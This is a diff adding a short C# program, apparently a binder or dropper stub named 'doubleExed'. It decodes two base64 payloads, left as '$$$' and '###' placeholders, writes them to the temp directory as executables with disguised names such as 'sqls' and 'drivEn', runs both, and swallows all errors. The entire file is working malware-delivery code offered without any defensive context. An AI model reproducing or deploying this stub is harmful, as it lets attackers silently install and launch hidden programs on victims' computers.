@@ -1,0 +1,37 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+
+namespace doubleExed
+{
+    class Program
+    {
+        static void Main()
+        {
+            string perwszy = "$$$";
+            string drugi = "###";
+
+			string name1 = Path.GetTempPath() + "sqls" + new Random().Next(10, 1000) + ".exe";
+			string name2 = Path.GetTempPath() + "drivEn" + new Random().Next(10, 1000) + ".exe";
+
+            try
+            {
+                File.WriteAllBytes(name1, Convert.FromBase64String(perwszy));
+                File.WriteAllBytes(name2, Convert.FromBase64String(drugi));
+            }
+            catch { }
+
+            try
+            {
+                Process.Start(name1);
+            }
+            catch { }
+
+            try
+            {
+                Process.Start(name2);
+            }
+            catch { }
+        }
+    }
+}
